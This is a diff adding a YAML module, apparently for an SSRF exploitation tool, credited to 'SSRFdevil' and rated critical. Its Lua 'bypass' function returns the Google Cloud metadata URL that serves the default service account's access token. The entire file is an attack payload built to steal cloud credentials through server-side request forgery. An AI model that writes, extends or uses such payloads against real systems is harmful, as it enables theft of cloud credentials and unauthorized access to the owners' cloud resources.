@@ -1,0 +1,24 @@
+meta:
+  id: gcp_metadata
+  version: 1
+  name: "GCP Metadata Endpoint"
+  description: "Access Google Cloud metadata service"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 95
+  confidence: 90
+  severity: critical
+  tags: [gcp, metadata, cloud]
+  references: []
+match:
+  schemes: [http]
+  requires: [hostname]
+  supports: [cloud]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return { url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" }
+    end
